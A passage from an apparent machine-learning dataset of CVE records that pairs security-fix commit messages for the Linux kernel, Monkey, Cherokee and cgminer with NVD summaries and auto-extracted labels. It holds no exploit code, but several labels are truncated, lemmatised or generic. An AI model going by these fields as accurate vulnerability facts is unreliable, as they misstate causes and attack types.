caused\nin the server quering repetitive non-existent resources.\n\nWhen serving a static file, the core use Vhost FDT mechanism, but if\nit sends a static error page it does a direct open(2). When closing\nthe resources for the same request it was just calling mk_vhost_close()\nwhich did not clear properly the file descriptor.\n\nThis patch adds a new field on the struct session_request called 'fd_is_fdt',\nwhich contains MK_TRUE or MK_FALSE depending of how fd_file was opened.\n\nThanks to Matthew Daley <mattd@bugfuzz.com> for report and troubleshoot this\nproblem.\n\nSigned-off-by: Eduardo Silva <eduardo@monkey.io>","summary":"Monkey HTTP Server before 1.5.3, when the File Descriptor Table (FDT) is enabled and custom error messages are set, allows remote attackers to cause a denial of service (file descriptor consumption) via an HTTP request that triggers an error message.","commit_message_1":"new request session flag to mark those file opened by fdt this patch aim to fix a potential ddos problem that can be caused in the server quering repetitive non-existent resource","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an http request that triggers an error message","Impact":"cause a denial of service ( file descriptor consumption )","Root Cause":"caused by an error on systems with the File Descriptor Table (FDT) mechanism enabled","Attack Type":"remote attacker"},{"commit_id":"9566d6742852c527bf5af38af5cbb878dad75705","cve_id":"CVE-2014-5207","cwe_id":"CWE-264","commit_message":"mnt: Correct permission checks in do_remount\n\nWhile invesgiating the issue where in \"mount --bind -oremount,ro ...\"\nwould result in later \"mount --bind -oremount,rw\" succeeding even if\nthe mount started off locked I realized that there are several\nadditional mount flags that should be locked and are not.\n\nIn particular MNT_NOSUID, MNT_NODEV, MNT_NOEXEC, and the atime\nflags in addition to MNT_READONLY should all be locked.  These\nflags are all per superblock, can all be changed with MS_BIND,\nand should not be changable if set by a more privileged user.\n\nThe following additions to the current logic are added in this patch.\n- nosuid may not be clearable by a less privileged user.\n- nodev  may not be clearable by a less privielged user.\n- noexec may not be clearable by a less privileged user.\n- atime flags may not be changeable by a less privileged user.\n\nThe logic with atime is that always setting atime on access is a\nglobal policy and backup software and auditing software could break if\natime bits are not updated (when they are configured to be updated),\nand serious performance degradation could result (DOS attack) if atime\nupdates happen when they have been explicitly disabled.  Therefore an\nunprivileged user should not be able to mess with the atime bits set\nby a more privileged user.\n\nThe additional restrictions are implemented with the addition of\nMNT_LOCK_NOSUID, MNT_LOCK_NODEV, MNT_LOCK_NOEXEC, and MNT_LOCK_ATIME\nmnt flags.\n\nTaken together these changes and the fixes for MNT_LOCK_READONLY\nshould make it safe for an unprivileged user to create a user\nnamespace and to call \"mount --bind -o remount,... ...\" without\nthe danger of mount flags being changed maliciously.\n\nCc: stable@vger.kernel.org\nAcked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"fs\/namespace.c in the Linux kernel through 3.16.1 does not properly restrict clearing MNT_NODEV, MNT_NOSUID, and MNT_NOEXEC and changing MNT_ATIME_MASK during a remount of a bind mount, which allows local users to gain privileges, interfere with backups and auditing on systems that had atime enabled, or cause a denial of service (excessive filesystem updating) on systems that had atime disabled via a *mount -o remount* command within a user namespace.","commit_message_1":"correct permission check in do_remount while invesgiating the issue where in `` mount -- bind -oremount , ro","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a *mount -o remount* command within a user namespace","Impact":"gain privileges , interfere with backups and auditing on systems that had atime enabled , or cause a denial of service ( excessive filesystem updating ) on systems that had atime disabled via","Root Cause":"does not properly restrict clearing mnt _ nodev , mnt _ nosuid , and mnt _ noexec and changing mnt _ atime _ mask during a remount of a bind mount","Attack Type":"local attacker"},{"commit_id":"a6138db815df5ee542d848318e5dae681590fccd","cve_id":"CVE-2014-5206","cwe_id":"CWE-264","commit_message":"mnt: Only change user settable mount flags in remount\n\nKenton Varda <kenton@sandstorm.io> discovered that by remounting a\nread-only bind mount read-only in a user namespace the\nMNT_LOCK_READONLY bit would be cleared, allowing an unprivileged user\nto the remount a read-only mount read-write.\n\nCorrect this by replacing the mask of mount flags to preserve\nwith a mask of mount flags that may be changed, and preserve\nall others.   This ensures that any future bugs with this mask and\nremount will fail in an easy to detect way where new mount flags\nsimply won't change.\n\nCc: stable@vger.kernel.org\nAcked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"The do_remount function in fs\/namespace.c in the Linux kernel through 3.16.1 does not maintain the MNT_LOCK_READONLY bit across a remount of a bind mount, which allows local users to bypass an intended read-only restriction and defeat certain sandbox protection mechanisms via a *mount -o remount* command within a user namespace.","commit_message_1":"only change user settable mount flag in remount kenton varda < kenton @ <file> > discovered that by remounting a read-only bind mount read-only in a user namespace the mnt_lock_readonly bit would be cleared , allowing an unprivileged user to the remount a read-only mount read-write","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a * mount - o remount * command within a user namespace","Impact":"bypass an intended read - only restriction and defeat certain sandbox protection mechanisms","Root Cause":"does not maintain the mnt _ lock _ readonly bit across a remount of a bind mount","Attack Type":"local attacker"},{"commit_id":"1be9a950c646c9092fb3618197f7b6bfb50e82aa","cve_id":"CVE-2014-5077","cwe_id":null,"commit_message":"net: sctp: inherit auth_capable on INIT collisions\n\nJason reported an oops caused by SCTP on his ARM machine with\nSCTP authentication enabled:\n\nInternal error: Oops: 17 [#1] ARM\nCPU: 0 PID: 104 Comm: sctp-test Not tainted 3.13.0-68744-g3632f30c9b20-dirty #1\ntask: c6eefa40 ti: c6f52000 task.ti: c6f52000\nPC is at sctp_auth_calculate_hmac+0xc4\/0x10c\nLR is at sg_init_table+0x20\/0x38\npc : [<c024bb80>]    lr : [<c00f32dc>]    psr: 40000013\nsp : c6f538e8  ip : 00000000  fp : c6f53924\nr10: c6f50d80  r9 : 00000000  r8 : 00010000\nr7 : 00000000  r6 : c7be4000  r5 : 00000000  r4 : c6f56254\nr3 : c00c8170  r2 : 00000001  r1 : 00000008  r0 : c6f1e660\nFlags: nZcv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user\nControl: 0005397f  Table: 06f28000  DAC: 00000015\nProcess sctp-test (pid: 104, stack limit = 0xc6f521c0)\nStack: (0xc6f538e8 to 0xc6f54000)\n[...]\nBacktrace:\n[<c024babc>] (sctp_auth_calculate_hmac+0x0\/0x10c) from [<c0249af8>] (sctp_packet_transmit+0x33c\/0x5c8)\n[<c02497bc>] (sctp_packet_transmit+0x0\/0x5c8) from [<c023e96c>] (sctp_outq_flush+0x7fc\/0x844)\n[<c023e170>] (sctp_outq_flush+0x0\/0x844) from [<c023ef78>] (sctp_outq_uncork+0x24\/0x28)\n[<c023ef54>] (sctp_outq_uncork+0x0\/0x28) from [<c0234364>] (sctp_side_effects+0x1134\/0x1220)\n[<c0233230>] (sctp_side_effects+0x0\/0x1220) from [<c02330b0>] (sctp_do_sm+0xac\/0xd4)\n[<c0233004>] (sctp_do_sm+0x0\/0xd4) from [<c023675c>] (sctp_assoc_bh_rcv+0x118\/0x160)\n[<c0236644>] (sctp_assoc_bh_rcv+0x0\/0x160) from [<c023d5bc>] (sctp_inq_push+0x6c\/0x74)\n[<c023d550>] (sctp_inq_push+0x0\/0x74) from [<c024a6b0>] (sctp_rcv+0x7d8\/0x888)\n\nWhile we already had various kind of bugs in that area\nec0223ec48a9 (\"net: sctp: fix sctp_sf_do_5_1D_ce to verify if\nwe\/peer is AUTH capable\") and b14878ccb7fa (\"net: sctp: cache\nauth_enable per endpoint\"), this one is a bit of a different\nkind.\n\nGiving a bit more background on why SCTP authentication is\nneeded can be found in RFC4895:\n\n  SCTP uses 32-bit verification tags to protect itself against\n  blind attackers. These values are not changed during the\n  lifetime of an SCTP association.\n\n  Looking at new SCTP extensions, there is the need to have a\n  method of proving that an SCTP chunk(s) was really sent by\n  the original peer that started the association and not by a\n  malicious attacker.\n\nTo cause this bug, we're triggering an INIT collision between\npeers; normal SCTP handshake where both sides intent to\nauthenticate packets contains RANDOM; CHUNKS; HMAC-ALGO\nparameters that are being negotiated among peers:\n\n  ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ---------->\n  <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] ---------\n  -------------------- COOKIE-ECHO -------------------->\n  <-------------------- COOKIE-ACK ---------------------\n\nRFC4895 says that each endpoint therefore knows its own random\nnumber and the peer's random number *after* the association\nhas been established. The local and peer's random number along\nwith the shared key are then part of the secret used for\ncalculating the HMAC in the AUTH chunk.\n\nNow, in our scenario, we have 2 threads with 1 non-blocking\nSEQ_PACKET socket each, setting up common shared SCTP_AUTH_KEY\nand SCTP_AUTH_ACTIVE_KEY properly, and each of them calling\nsctp_bindx(3), listen(2) and connect(2) against each other,\nthus the handshake looks similar to this, e.g.:\n\n  ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ---------->\n  <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] ---------\n  <--------- INIT[RANDOM; CHUNKS; HMAC-ALGO] -----------\n  -------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] -------->\n  ...\n\nSince such collisions can also happen with verification tags,\nthe RFC4895 for AUTH rather vaguely says under section 6.1:\n\n  In case of INIT collision, the rules governing the handling\n  of this Random Number follow the same pattern as those for\n  the Verification Tag, as explained in Section 5.2.4 of\n  RFC 2960 [5]. Therefore, each endpoint knows its own Random\n  Number and the peer's Random Number after the association\n  has been established.\n\nIn RFC2960, section 5.2.4, we're eventually hitting Action B:\n\n  B) In this case, both sides may be attempting to start an\n     association at about the same time but the peer endpoint\n     started its INIT after responding to the local endpoint's\n     INIT. Thus it may have picked a new Verification Tag not\n     being aware of the previous Tag it had sent this endpoint.\n     The endpoint should stay in or enter the ESTABLISHED\n     state but it MUST update its peer's Verification Tag from\n     the State Cookie, stop any init or cookie timers that may\n     running and send a COOKIE ACK.\n\nIn other words, the handling of the Random parameter is the\nsame as behavior for the Verification Tag as described in\nAction B of section 5.2.4.\n\nLooking at the code, we exactly hit the sctp_sf_do_dupcook_b()\ncase which triggers an SCTP_CMD_UPDATE_ASSOC command to the\nside effect interpreter, and in fact it properly copies over\npeer_{random, hmacs, chunks} parameters from the newly created\nassociation to update the existing one.\n\nAlso, the old asoc_shared_key is being released and based on\nthe new params, sctp_auth_asoc_init_active_key() updated.\nHowever, the issue observed in this case is that the previous\nasoc->peer.auth_capable was 0, and has *not* been updated, so\nthat instead of creating a new secret, we're doing an early\nreturn from the function sctp_auth_asoc_init_active_key()\nleaving asoc->asoc_shared_key as NULL. However, we now have to\nauthenticate chunks from the updated chunk list (e.g. COOKIE-ACK).\n\nThat in fact causes the server side when responding with ...\n\n  <------------------ AUTH; COOKIE-ACK -----------------\n\n... to trigger a NULL pointer dereference, since in\nsctp_packet_transmit(), it discovers that an AUTH chunk is\nbeing queued for xmit, and thus it calls sctp_auth_calculate_hmac().\n\nSince the asoc->active_key_id is still inherited from the\nendpoint, and the same as encoded into the chunk, it uses\nasoc->asoc_shared_key, which is still NULL, as an asoc_key\nand dereferences it in ...\n\n  crypto_hash_setkey(desc.tfm, &asoc_key->data[0], asoc_key->len)\n\n... causing an oops. All this happens because sctp_make_cookie_ack()\ncalled with the *new* association has the peer.auth_capable=1\nand therefore marks the chunk with auth=1 after checking\nsctp_auth_send_cid(), but it is *actually* sent later on over\nthe then *updated* association's transport that didn't initialize\nits shared key due to peer.auth_capable=0. Since control chunks\nin that case are not sent by the temporary association which\nare scheduled for deletion, they are issued for xmit via\nSCTP_CMD_REPLY in the interpreter with the context of the\n*updated* association. peer.auth_capable was 0 in the updated\nassociation (which went from COOKIE_WAIT into ESTABLISHED state),\nsince all previous processing that performed sctp_process_init()\nwas being done on temporary associations, that we eventually\nthrow away each time.\n\nThe correct fix is to update to the new peer.auth_capable\nvalue as well in the collision case via sctp_assoc_update(),\nso that in case the collision migrated from 0 -> 1,\nsctp_auth_asoc_init_active_key() can properly recalculate\nthe secret. This therefore fixes the observed server panic.\n\nFixes: 730fc3d05cd4 (\"[SCTP]: Implete SCTP-AUTH parameter processing\")\nReported-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nTested-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>\nCc: Vlad Yasevich <vyasevich@gmail.com>\nAcked-by: Vlad Yasevich <vyasevich@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_assoc_update function in net\/sctp\/associola.c in the Linux kernel through 3.15.8, when SCTP authentication is enabled, allows remote attackers to cause a denial of service (NULL pointer dereference and OOPS) by starting to establish an association between two endpoints immediately after an exchange of INIT and INIT ACK chunks to establish an earlier association between these endpoints in the opposite direction.","commit_message_1":"sctp : inherit auth_capable on init collision jason reported an oops caused by sctp on his arm machine with sctp authentication enabled : internal error : oops : <number> [ # <number> ] arm cpu : <number> pid : <number> comm : sctp-test not tainted <file>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by starting to establish an association between two endpoints immediately after an exchange of init and init ack chunks to establish an earlier association between these endpoints in the opposite direction .","Impact":"cause a denial of service ( pointer dereference and oops )","Root Cause":"sctp authentication is enabled ","Attack Type":"remote attacker"},{"commit_id":"295dc39d941dc2ae53d5c170365af4c9d5c16212","cve_id":"CVE-2014-5045","cwe_id":"CWE-59","commit_message":"fs: umount on symlink leaks mnt count\n\nCurrently umount on symlink blocks following umount:\n\n\/vz is separate mount\n\n# ls \/vz\/ -al | grep test\ndrwxr-xr-x.  2 root root       4096 Jul 19 01:14 testdir\nlrwxrwxrwx.  1 root root         11 Jul 19 01:16 testlink -> \/vz\/testdir\n# umount -l \/vz\/testlink\numount: \/vz\/testlink: not mounted (expected)\n\n# lsof \/vz\n# umount \/vz\numount: \/vz: device is busy. (unexpected)\n\nIn this case mountpoint_last() gets an extra refcount on path->mnt\n\nSigned-off-by: Vasily Averin <vvs@openvz.org>\nAcked-by: Ian Kent <raven@themaw.net>\nAcked-by: Jeff Layton <jlayton@primarydata.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Christoph Hellwig <hch@lst.de>","summary":"The mountpoint_last function in fs\/namei.c in the Linux kernel before 3.15.8 does not properly maintain a certain reference count during attempts to use the umount system call in conjunction with a symlink, which allows local users to cause a denial of service (memory consumption or use-after-free) or possibly have unspecified other impact via the umount program.","commit_message_1":"umount on symlink leak mnt count currently umount on symlink block following umount : \/vz is separate mount # l \/vz\/ -al | grep test drwxr-xr-x","Vulnerability Type":"Link Following","Attack Vector":"via the umount program .","Impact":"cause a denial of service ( memory consumption or use - after - free ) or possibly have unspecified other impact","Root Cause":"does not properly maintain a certain reference count during attempts to use the umount system call","Attack Type":"local attacker"},{"commit_id":"3cf521f7dc87c031617fd47e4b7aa2593c2f3daf","cve_id":"CVE-2014-4943","cwe_id":"CWE-264","commit_message":"net\/l2tp: don't fall back on UDP [get|set]sockopt\n\nThe l2tp [get|set]sockopt() code has fallen back to the UDP functions\nfor socket option levels != SOL_PPPOL2TP since day one, but that has\nnever actually worked, since the l2tp socket isn't an inet socket.\n\nAs David Miller points out:\n\n  \"If we wanted this to work, it'd have to look up the tunnel and then\n   use tunnel->sk, but I wonder how useful that would be\"\n\nSince this can never have worked so nobody could possibly have depended\non that functionality, just remove the broken code and return -EINVAL.\n\nReported-by: Sasha Levin <sasha.levin@oracle.com>\nAcked-by: James Chapman <jchapman@katalix.com>\nAcked-by: David Miller <davem@davemloft.net>\nCc: Phil Turnbull <phil.turnbull@oracle.com>\nCc: Vegard Nossum <vegard.nossum@oracle.com>\nCc: Willy Tarreau <w@1wt.eu>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The PPPoL2TP feature in net\/l2tp\/l2tp_ppp.c in the Linux kernel through 3.15.6 allows local users to gain privileges by leveraging data-structure differences between an l2tp socket and an inet socket.","commit_message_1":"do n't fall back on udp [ get|set ] sockopt the l2tp [ get|set ] sockopt ( ) code ha fallen back to the udp function for socket option level ! = sol_pppol2tp since day one , but that ha never actually worked , since the l2tp socket is n't an inet socket","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging data - structure differences between an l2tp socket and an inet socket","Impact":"gain privileges","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"fbda667221c51f0aa476a02366e0cf66cb012f88","cve_id":"CVE-2014-4668","cwe_id":"CWE-287","commit_message":"Prevent the LDAP validator from accepting an empty password.","summary":"The cherokee_validator_ldap_check function in validator_ldap.c in Cherokee 1.2.103 and earlier, when LDAP is used, does not properly consider unauthenticated-bind semantics, which allows remote attackers to bypass authentication via an empty password.","commit_message_1":"prevent the ldap validator from accepting an empty password","Vulnerability Type":"Improper Authentication","Attack Vector":"via an empty password .","Impact":"bypass authentication","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"d3217b15a19a4779c39b212358a5c71d725822ee","cve_id":"CVE-2014-4667","cwe_id":"CWE-20","commit_message":"sctp: Fix sk_ack_backlog wrap-around problem\n\nConsider the scenario:\nFor a TCP-style socket, while processing the COOKIE_ECHO chunk in\nsctp_sf_do_5_1D_ce(), after it has passed a series of sanity check,\na new association would be created in sctp_unpack_cookie(), but afterwards,\nsome processing maybe failed, and sctp_association_free() will be called to\nfree the previously allocated association, in sctp_association_free(),\nsk_ack_backlog value is decremented for this socket, since the initial\nvalue for sk_ack_backlog is 0, after the decrement, it will be 65535,\na wrap-around problem happens, and if we want to establish new associations\nafterward in the same socket, ABORT would be triggered since sctp deem the\naccept queue as full.\nFix this issue by only decrementing sk_ack_backlog for associations in\nthe endpoint's list.\n\nFix-suggested-by: Neil Horman <nhorman@tuxdriver.com>\nSigned-off-by: Xufeng Zhang <xufeng.zhang@windriver.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nAcked-by: Vlad Yasevich <vyasevich@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_association_free function in net\/sctp\/associola.c in the Linux kernel before 3.15.2 does not properly manage a certain backlog value, which allows remote attackers to cause a denial of service (socket outage) via a crafted SCTP packet.","commit_message_1":"fix sk_ack_backlog wrap-around problem consider the scenario : for a tcp-style socket , while processing the cookie_echo chunk in sctp_sf_do_5_1d_ce ( ) , after it ha passed a series of sanity check , a new association would be created in sctp_unpack_cookie ( ) , but afterwards , some processing maybe failed , and sctp_association_free ( ) will be called to free the previously allocated association , in sctp_association_free ( ) , sk_ack_backlog value is decremented for this socket , since the initial value for sk_ack_backlog is <number> , after the decrement , it will be <number> , a wrap-around problem happens , and if we want to establish new association afterward in the same socket , abort would be triggered since sctp deem the accept queue a full","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted sctp packet","Impact":"cause a denial of service ( socket outage )","Root Cause":"does not properly manage a certain backlog value","Attack Type":"remote attacker"},{"commit_id":"ac902c112d90a89e59916f751c2745f4dbdbb4bd","cve_id":"CVE-2014-4656","cwe_id":"CWE-189","commit_message":"ALSA: control: Handle numid overflow\n\nEach control gets automatically assigned its numids when the control is created.\nThe allocation is done by incrementing the numid by the amount of allocated\nnumids per allocation. This means that excessive creation and destruction of\ncontrols (e.g. via SNDRV_CTL_IOCTL_ELEM_ADD\/REMOVE) can cause the id to\neventually overflow. Currently when this happens for the control that caused the\noverflow kctl->id.numid + kctl->count will also over flow causing it to be\nsmaller than kctl->id.numid. Most of the code assumes that this is something\nthat can not happen, so we need to make sure that it won't happen\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nAcked-by: Jaroslav Kysela <perex@perex.cz>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"Multiple integer overflows in sound\/core\/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 allow local users to cause a denial of service by leveraging \/dev\/snd\/controlCX access, related to (1) index values in the snd_ctl_add function and (2) numid values in the snd_ctl_remove_numid_conflict function.","commit_message_1":"control : handle numid overflow each control get automatically assigned it numids when the control is created","Vulnerability Type":"integer overflow","Attack Vector":"by leveraging \/ dev \/ snd \/ controlcx access , related to ( 1 ) index values in the snd _ ctl _ add function and ( 2 ) numid values in the snd _ ctl _ remove _ numid _ conflict function","Impact":"cause a denial of service","Root Cause":"caused by improper bounds checking by the snd_ctl_add() and snd_ctl_remove_numid_conflict() functions","Attack Type":"local attacker"},{"commit_id":"82262a46627bebb0febcc26664746c25cef08563","cve_id":"CVE-2014-4655","cwe_id":"CWE-189","commit_message":"ALSA: control: Fix replacing user controls\n\nThere are two issues with the current implementation for replacing user\ncontrols. The first is that the code does not check if the control is actually a\nuser control and neither does it check if the control is owned by the process\nthat tries to remove it. That allows userspace applications to remove arbitrary\ncontrols, which can cause a user after free if a for example a driver does not\nexpect a control to be removed from under its feed.\n\nThe second issue is that on one hand when a control is replaced the\nuser_ctl_count limit is not checked and on the other hand the user_ctl_count is\nincreased (even though the number of user controls does not change). This allows\nuserspace, once the user_ctl_count limit as been reached, to repeatedly replace\na control until user_ctl_count overflows. Once that happens new controls can be\nadded effectively bypassing the user_ctl_count limit.\n\nBoth issues can be fixed by instead of open-coding the removal of the control\nthat is to be replaced to use snd_ctl_remove_user_ctl(). This function does\nproper permission checks as well as decrements user_ctl_count after the control\nhas been removed.\n\nNote that by using snd_ctl_remove_user_ctl() the check which returns -EBUSY at\nbeginning of the function if the control already exists is removed. This is not\na problem though since the check is quite useless, because the lock that is\nprotecting the control list is released between the check and before adding the\nnew control to the list, which means that it is possible that a different\ncontrol with the same settings is added to the list after the check. Luckily\nthere is another check that is done while holding the lock in snd_ctl_add(), so\nwe'll rely on that to make sure that the same control is not added twice.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nAcked-by: Jaroslav Kysela <perex@perex.cz>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"The snd_ctl_elem_add function in sound\/core\/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 does not properly maintain the user_ctl_count value, which allows local users to cause a denial of service (integer overflow and limit bypass) by leveraging \/dev\/snd\/controlCX access for a large number of SNDRV_CTL_IOCTL_ELEM_REPLACE ioctl calls.","commit_message_1":"control : fix replacing user control there are two issue with the current implementation for replacing user control","Vulnerability Type":"Numeric Errors","Attack Vector":"by leveraging \/ dev \/ snd \/ controlcx access for a large number of sndrv _ ctl _ ioctl _ elem _ replace ioctl calls","Impact":"cause a denial of service ( integer overflow and limit bypass )","Root Cause":"does not properly maintain the user _ ctl _ count value","Attack Type":"local attacker"},{"commit_id":"fd9f26e4eca5d08a27d12c0933fceef76ed9663d","cve_id":"CVE-2014-4653","cwe_id":null,"commit_message":"ALSA: control: Don't access controls outside of protected regions\n\nA control that is visible on the card->controls list can be freed at any time.\nThis means we must not access any of its memory while not holding the\ncontrols_rw_lock. Otherwise we risk a use after free access.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nAcked-by: Jaroslav Kysela <perex@perex.cz>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"sound\/core\/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 does not ensure possession of a read\/write lock, which allows local users to cause a denial of service (use-after-free) and obtain sensitive information from kernel memory by leveraging \/dev\/snd\/controlCX access.","commit_message_1":"control : do n't access control outside of protected region a control that is visible on the card- > control list can be freed at any time","Vulnerability Type":"use-after-free","Attack Vector":"by leveraging \/ dev \/ snd \/ controlcx access","Impact":"cause a denial of service ( use - after - free ) and obtain sensitive information from kernel memory","Root Cause":"does not ensure possession of a read \/ write lock","Attack Type":"local attacker"},{"commit_id":"07f4d9d74a04aa7c72c5dae0ef97565f28f17b92","cve_id":"CVE-2014-4652","cwe_id":"CWE-362","commit_message":"ALSA: control: Protect user controls against concurrent access\n\nThe user-control put and get handlers as well as the tlv do not protect against\nconcurrent access from multiple threads. Since the state of the control is not\nupdated atomically it is possible that either two write operations or a write\nand a read operation race against each other. Both can lead to arbitrary memory\ndisclosure. This patch introduces a new lock that protects user-controls from\nconcurrent access. Since applications typically access controls sequentially\nthan in parallel a single lock per card should be fine.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nAcked-by: Jaroslav Kysela <perex@perex.cz>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"Race condition in the tlv handler functionality in the snd_ctl_elem_user_tlv function in sound\/core\/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 allows local users to obtain sensitive information from kernel memory by leveraging \/dev\/snd\/controlCX access.","commit_message_1":"control : protect user control against concurrent access the user-control put and get handler a well a the tlv do not protect against concurrent access from multiple thread","Vulnerability Type":"Race Condition","Attack Vector":"by leveraging \/ dev \/ snd \/ controlcx access","Impact":"obtain sensitive information from kernel memory","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"206204a1162b995e2185275167b22468c00d6b36","cve_id":"CVE-2014-4611","cwe_id":"CWE-20","commit_message":"lz4: ensure length does not wrap\n\nGiven some pathologically compressed data, lz4 could possibly decide to\nwrap a few internal variables, causing unknown things to happen.  Catch\nthis before the wrapping happens and abort the decompression.\n\nReported-by: \"Don A. Bailey\" <donb@securitymouse.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"Integer overflow in the LZ4 algorithm implementation, as used in Yann Collet LZ4 before r118 and in the lz4_uncompress function in lib\/lz4\/lz4_decompress.c in the Linux kernel before 3.15.2, on 32-bit platforms might allow context-dependent attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a crafted Literal Run that would be improperly handled by programs not complying with an API limitation, a different vulnerability than CVE-2014-4715.","commit_message_1":"ensure length doe not wrap given some pathologically compressed data , lz4 could possibly decide to wrap a few internal variable , causing unknown thing to happen","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted literal run that would be improperly","Impact":"cause a denial of service ( memory corruption ) or possibly have","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"206a81c18401c0cde6e579164f752c4b147324ce","cve_id":"CVE-2014-4608","cwe_id":"CWE-119","commit_message":"lzo: properly check for overruns\n\nThe lzo decompressor can, if given some really crazy data, possibly\noverrun some variable types.  Modify the checking logic to properly\ndetect overruns before they happen.\n\nReported-by: \"Don A. Bailey\" <donb@securitymouse.com>\nTested-by: \"Don A. Bailey\" <donb@securitymouse.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"** DISPUTED ** Multiple integer overflows in the lzo1x_decompress_safe function in lib\/lzo\/lzo1x_decompress_safe.c in the LZO decompressor in the Linux kernel before 3.15.2 allow context-dependent attackers to cause a denial of service (memory corruption) via a crafted Literal Run.  NOTE: the author of the LZO algorithms says *the Linux kernel is *not* affected; media hype.*","commit_message_1":"properly check for overrun the lzo decompressor can , if given some really crazy data , possibly overrun some variable type","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted literal run","Impact":"cause a denial of service ( memory corruption","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"910c36089940e81fb85c65b8e63dcd2fac71470c","cve_id":"CVE-2014-4503","cwe_id":"CWE-20","commit_message":"stratum: parse_notify(): Don't die on malformed bbversion\/prev_hash\/nbit\/ntime.\n\nMight have introduced a memory leak, don't have time to check. :(\n\nShould the other hex2bin()'s be checked?\n\nThanks to Mick Ayzenberg <mick.dejavusecurity.com> for finding this.","summary":"The parse_notify function in util.c in sgminer before 4.2.2 and cgminer 3.3.0 through 4.0.1 allows man-in-the-middle attackers to cause a denial of service (application exit) via a crafted (1) bbversion, (2) prev_hash, (3) nbit, or (4) ntime parameter in a mining.notify action stratum message.","commit_message_1":"parse_notify ( ) : do n't die on malformed bbversion\/prev_hash\/nbit\/ntime","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted ( 1 ) bbversion , ( 2 ) prev _ hash , ( 3 ) nbit , or ( 4 ) ntime parameter in a mining . notify action stratum message","Impact":"cause a denial of service ( application exit )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"e1c5050734123973b99d181c45e74b2cbb00272e","cve_id":"CVE-2014-4502","cwe_id":"CWE-119","commit_message":"Do some random sanity checking for stratum message parsing","summary":"Multiple heap-based buffer overflows in the parse_notify function in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 4.1.0 allow remote pool servers to have unspecified impact via a (1) large or (2) negative value in the Extranonc2_size parameter in a mining.subscribe response and a crafted mining.notify request.","commit_message_1":"do some random sanity checking for stratum message parsing","Vulnerability Type":"buffer overflow","Attack Vector":"via a ( 1 ) large or ( 2 ) negative value in the extranonc2 _ size parameter in a mining . subscribe response and a crafted mining . notify request . impact","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking when handling malicious messages","Attack Type":"remote attacker"},{"commit_id":"b65574bef233474e915fdf18614aa211e31cc6c2","cve_id":"CVE-2014-4501","cwe_id":"CWE-119","commit_message":"Stratum: extract_sockaddr: Truncate overlong addresses rather than stack overflow\n\nThanks to Mick Ayzenberg <mick@dejavusecurity.com> for finding this!","summary":"Multiple stack-based buffer overflows in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 3.3.0 allow remote pool servers to have unspecified impact via a long URL in a client.reconnect stratum message to the (1) extract_sockaddr or (2) parse_reconnect functions in util.c.","commit_message_1":"extract_sockaddr : truncate overlong address rather than stack overflow thanks to mick ayzenberg < mick @ <file> > for finding this !","Vulnerability Type":"buffer overflow","Attack Vector":"via a long url in a client . reconnect stratum message to the ( 1 ) extract _ sockaddr or ( 2 ) parse _ reconnect functions in util . c","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking when handling malicious messages","Attack Type":"remote 